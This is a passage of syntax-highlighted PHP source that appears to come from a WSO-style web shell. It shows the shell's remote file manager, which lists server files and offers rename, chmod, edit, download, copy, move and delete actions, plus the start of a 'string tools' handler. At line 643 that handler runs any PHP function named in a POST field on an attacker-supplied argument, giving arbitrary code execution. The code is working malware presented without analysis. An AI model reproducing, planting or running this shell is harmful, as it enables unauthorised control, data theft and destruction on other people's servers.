<span class="lineno"> 566</span>     <span class="k">if</span><span class="p">(</span><span class="nv">$dirContent</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>    <span class="k">echo</span> <span class="s1">&#39;Can\&#39;t open this folder!&#39;</span><span class="p">;</span> <span class="k">return</span><span class="p">;</span>    <span class="p">}</span>
<span class="lineno"> 567</span>     <span class="k">global</span> <span class="nv">$sort</span><span class="p">;</span> 
<span class="lineno"> 568</span>     <span class="nv">$sort</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> 
<span class="lineno"> 569</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 570</span>         <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;!s_([A-z]+)_(\d{1})!&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$match</span><span class="p">))</span> 
<span class="lineno"> 571</span>             <span class="nv">$sort</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$match</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span> 
<span class="lineno"> 572</span>     <span class="p">}</span> 
<span class="lineno"> 573</span> <span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno"> 574</span> <span class="x">&lt;script&gt; </span>
<span class="lineno"> 575</span> <span class="x">    function sa() { </span>
<span class="lineno"> 576</span> <span class="x">        for(i=0;i&lt;document.files.elements.length;i++) </span>
<span class="lineno"> 577</span> <span class="x">            if(document.files.elements[i].type == &#39;checkbox&#39;) </span>
<span class="lineno"> 578</span> <span class="x">                document.files.elements[i].checked = document.files.elements[0].checked; </span>
<span class="lineno"> 579</span> <span class="x">    } </span>
<span class="lineno"> 580</span> <span class="x">&lt;/script&gt; </span>
<span class="lineno"> 581</span> <span class="x">&lt;table width=&#39;100%&#39; class=&#39;main&#39; cellspacing=&#39;0&#39; cellpadding=&#39;2&#39;&gt; </span>
<span class="lineno"> 582</span> <span class="x">&lt;form name=files method=post&gt; </span>
<span class="lineno"> 583</span> <span class="cp">&lt;?php</span> 
<span class="lineno"> 584</span>     <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;th width=&#39;13px&#39;&gt;&lt;input type=checkbox onclick=&#39;sa()&#39; class=chkbx&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">s_name_&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">s_size_&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">s_modify_&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;Modify&lt;/a&gt;&lt;/th&gt;&lt;th&gt;Owner/Group&lt;/th&gt;&lt;th&gt;&lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">s_perms_&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;Permissions&lt;/a&gt;&lt;/th&gt;&lt;th&gt;Actions&lt;/th&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span> 
<span class="lineno"> 585</span>     <span class="nv">$dirs</span> <span class="o">=</span> <span class="nv">$files</span> <span class="o">=</span> <span class="nv">$links</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span> 
<span class="lineno"> 586</span>     <span class="nv">$n</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">);</span> 
<span class="lineno"> 587</span>     <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$n</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 588</span>         <span class="nv">$ow</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span> 
<span class="lineno"> 589</span>         <span class="nv">$gr</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getgrgid</span><span class="p">(</span><span class="o">@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span> 
<span class="lineno"> 590</span>         <span class="nv">$tmp</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span> <span class="o">=&gt;</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> 
<span class="lineno"> 591</span>                      <span class="s1">&#39;path&#39;</span> <span class="o">=&gt;</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> 
<span class="lineno"> 592</span>                      <span class="s1">&#39;modify&#39;</span> <span class="o">=&gt;</span> <span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span><span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">])),</span> 
<span class="lineno"> 593</span>                      <span class="s1">&#39;perms&#39;</span> <span class="o">=&gt;</span> <span class="nx">viewPermsColor</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]),</span>
<span class="lineno"> 594</span>                      <span class="s1">&#39;size&#39;</span> <span class="o">=&gt;</span> <span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]),</span> 
<span class="lineno"> 595</span>                      <span class="s1">&#39;owner&#39;</span> <span class="o">=&gt;</span> <span class="nv">$ow</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">?</span><span class="nv">$ow</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">:@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]),</span> 
<span class="lineno"> 596</span>                      <span class="s1">&#39;group&#39;</span> <span class="o">=&gt;</span> <span class="nv">$gr</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">?</span><span class="nv">$gr</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">:@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> 
<span class="lineno"> 597</span>                     <span class="p">);</span> 
<span class="lineno"> 598</span>         <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span> 
<span class="lineno"> 599</span>             <span class="nv">$files</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;file&#39;</span><span class="p">));</span> 
<span class="lineno"> 600</span>         <span class="k">elseif</span><span class="p">(</span><span class="o">@</span><span class="nb">is_link</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span> 
<span class="lineno"> 601</span>             <span class="nv">$links</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;link&#39;</span><span class="p">));</span> 
<span class="lineno"> 602</span>         <span class="k">elseif</span><span class="p">(</span><span class="o">@</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span><span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">))</span> 
<span class="lineno"> 603</span>             <span class="nv">$dirs</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;dir&#39;</span><span class="p">));</span> 
<span class="lineno"> 604</span>     <span class="p">}</span> 
<span class="lineno"> 605</span>     <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$sort</span><span class="p">;</span> 
<span class="lineno"> 606</span>     <span class="k">function</span> <span class="nf">cmp</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 607</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;size&#39;</span><span class="p">)</span> 
<span class="lineno"> 608</span>             <span class="k">return</span> <span class="nb">strcmp</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]],</span> <span class="nv">$b</span><span class="p">[</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]])</span><span class="o">*</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:-</span><span class="mi">1</span><span class="p">);</span> 
<span class="lineno"> 609</span>         <span class="k">else</span> 
<span class="lineno"> 610</span>             <span class="k">return</span> <span class="p">((</span><span class="nv">$a</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&lt;</span> <span class="nv">$b</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="o">-</span><span class="mi">1</span> <span class="o">:</span> <span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:-</span><span class="mi">1</span><span class="p">);</span> 
<span class="lineno"> 611</span>     <span class="p">}</span> 
<span class="lineno"> 612</span>     <span class="nb">usort</span><span class="p">(</span><span class="nv">$files</span><span class="p">,</span> <span class="s2">&quot;cmp&quot;</span><span class="p">);</span> 
<span class="lineno"> 613</span>     <span class="nb">usort</span><span class="p">(</span><span class="nv">$dirs</span><span class="p">,</span> <span class="s2">&quot;cmp&quot;</span><span class="p">);</span> 
<span class="lineno"> 614</span>     <span class="nb">usort</span><span class="p">(</span><span class="nv">$links</span><span class="p">,</span> <span class="s2">&quot;cmp&quot;</span><span class="p">);</span> 
<span class="lineno"> 615</span>     <span class="nv">$files</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$dirs</span><span class="p">,</span> <span class="nv">$links</span><span class="p">,</span> <span class="nv">$files</span><span class="p">);</span> 
<span class="lineno"> 616</span>     <span class="nv">$l</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
<span class="lineno"> 617</span>     <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 618</span>         <span class="k">echo</span> <span class="s1">&#39;&lt;tr&#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$l</span><span class="o">?</span><span class="s1">&#39; class=l1&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&gt;&lt;td&gt;&lt;input type=checkbox name=&quot;f[]&quot; value=&quot;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot; class=chkbx&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=# onclick=&quot;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;file&#39;</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;view\&#39;)&quot;&gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">:</span><span class="s1">&#39;g(\&#39;FilesMan\&#39;,\&#39;&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&gt;&lt;b&gt;[ &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39; ]&lt;/b&gt;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;file&#39;</span><span class="p">)</span><span class="o">?</span><span class="nx">viewSize</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">])</span><span class="o">:</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&lt;/td&gt;&lt;td&gt;&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;modify&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&lt;/td&gt;&lt;td&gt;&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;owner&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;group&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&lt;/td&gt;&lt;td&gt;&lt;a href=# onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;,\&#39;chmod\&#39;)&quot;&gt;&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;perms&#39;</span><span class="p">]</span> 
<span class="lineno"> 619</span>             <span class="o">.</span><span class="s1">&#39;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;rename\&#39;)&quot;&gt;R&lt;/a&gt; &lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;touch\&#39;)&quot;&gt;T&lt;/a&gt;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;file&#39;</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39; &lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;edit\&#39;)&quot;&gt;E&lt;/a&gt; &lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;download\&#39;)&quot;&gt;D&lt;/a&gt;&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/td&gt;&lt;/tr&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 620</span>         <span class="nv">$l</span> <span class="o">=</span> <span class="nv">$l</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span> 
<span class="lineno"> 621</span>     <span class="p">}</span> 
<span class="lineno"> 622</span>     <span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno"> 623</span> <span class="x">    &lt;tr&gt;&lt;td colspan=7&gt; </span>
<span class="lineno"> 624</span> <span class="x">    &lt;input type=hidden name=a value=&#39;FilesMan&#39;&gt; </span>
<span class="lineno"> 625</span> <span class="x">    &lt;input type=hidden name=c value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno"> 626</span> <span class="x">    &lt;input type=hidden name=charset value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno"> 627</span> <span class="x">    &lt;select name=&#39;p1&#39;&gt;&lt;option value=&#39;copy&#39;&gt;Copy&lt;/option&gt;&lt;option value=&#39;move&#39;&gt;Move&lt;/option&gt;&lt;option value=&#39;delete&#39;&gt;Delete&lt;/option&gt;</span><span class="cp">&lt;?php</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">])</span><span class="o">&amp;&amp;@</span><span class="nb">count</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">])){</span><span class="cp">?&gt;</span><span class="x">&lt;option value=&#39;paste&#39;&gt;Paste&lt;/option&gt;</span><span class="cp">&lt;?php</span> <span class="p">}</span><span class="cp">?&gt;</span><span class="x">&lt;/select&gt;&amp;nbsp;&lt;input type=&quot;submit&quot; value=&quot;&gt;&gt;&quot;&gt;&lt;/td&gt;&lt;/tr&gt; </span>
<span class="lineno"> 628</span> <span class="x">    &lt;/form&gt;&lt;/table&gt;&lt;/div&gt; </span>
<span class="lineno"> 629</span> <span class="x">    </span><span class="cp">&lt;?php</span> 
<span class="lineno"> 630</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno"> 631</span> <span class="p">}</span> 
<span class="lineno"> 632</span> 
<span class="lineno"> 633</span> <span class="k">function</span> <span class="nf">actionStringTools</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 634</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;hex2bin&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">hex2bin</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nb">decbin</span><span class="p">(</span><span class="nb">hexdec</span><span class="p">(</span><span class="nv">$p</span><span class="p">));}}</span> 
<span class="lineno"> 635</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;hex2ascii&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">hex2ascii</span><span class="p">(</span><span class="nv">$p</span><span class="p">){</span><span class="nv">$r</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">strLen</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span><span class="nv">$i</span><span class="o">+=</span><span class="mi">2</span><span class="p">){</span><span class="nv">$r</span><span class="o">.=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">hexdec</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="p">]));}</span><span class="k">return</span> <span class="nv">$r</span><span class="p">;}}</span> 
<span class="lineno"> 636</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;ascii2hex&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">ascii2hex</span><span class="p">(</span><span class="nv">$p</span><span class="p">){</span><span class="nv">$r</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span><span class="o">++</span><span class="nv">$i</span><span class="p">)</span><span class="nv">$r</span><span class="o">.=</span> <span class="nb">dechex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span><span class="k">return</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$r</span><span class="p">);}}</span> 
<span class="lineno"> 637</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;full_urlencode&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">full_urlencode</span><span class="p">(</span><span class="nv">$p</span><span class="p">){</span><span class="nv">$r</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span><span class="o">++</span><span class="nv">$i</span><span class="p">)</span><span class="nv">$r</span><span class="o">.=</span> <span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span><span class="k">return</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$r</span><span class="p">);}}</span> 
<span class="lineno"> 638</span>      
<span class="lineno"> 639</span>     <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 640</span>         <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span> 
<span class="lineno"> 641</span>         <span class="nb">ob_start</span><span class="p">();</span> 
<span class="lineno"> 642</span>         <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> 
<span class="lineno"> 643</span>             <span class="k">echo</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">](</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span> 
<span class="lineno"> 644</span>         <span class="nv">$temp</span> <span class="o">=</span> <span class="s2">&quot;document.getElementById(&#39;strOutput&#39;).style.display=&#39;&#39;;document.getElementById(&#39;strOutput&#39;).innerHTML=&#39;&quot;</span><span class="o">.</span><span class="nb">addcslashes</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">ob_get_clean</span><span class="p">()),</span><span class="s2">&quot;</span><span class="se">\n\r\t\\</span><span class="s2">&#39;&amp;#92;&amp;#48;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno"> 645</span>         <span class="k">echo</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$temp</span><span class="p">),</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">;</span> 
<span class="lineno"> 646</span>         <span class="k">exit</span><span class="p">;</span> 
<span class="lineno"> 647</span>     <span class="p">}</span> 
